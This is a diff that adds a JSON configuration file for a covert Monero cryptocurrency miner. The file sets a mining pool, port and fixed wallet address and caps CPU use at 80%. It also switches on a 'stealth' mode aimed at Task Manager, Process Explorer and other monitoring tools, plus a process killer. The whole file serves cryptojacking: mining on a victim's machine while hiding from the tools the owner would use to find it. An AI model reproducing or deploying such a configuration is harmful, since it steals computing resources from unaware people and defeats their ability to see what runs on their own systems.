@@ -1,0 +1,18 @@
+{
+	"algo": "rx/0",
+	"pool": "pool.minexmr.com ",
+	"port": 4444,
+	"wallet": "46pU4jyBZ1EJPmKHujFBjGEgZztKnWHuHRAks4ZQwK1a3Kow86emzr96nBk1LoEgdfYgRc5GV3SGaGGBnzzCS28eF2f24Qs",
+	"password": "",
+	"rig-id": "",
+	"keepalive": false,
+	"nicehash": false,
+	"ssltls": true,
+	"max-cpu": 80,
+	"idle-wait": 3,
+	"idle-cpu": 100,
+	"stealth": true,
+	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+	"process-killer": true,
+	"kill-targets": "program1.exe,program2.exe,program3.exe"
+}
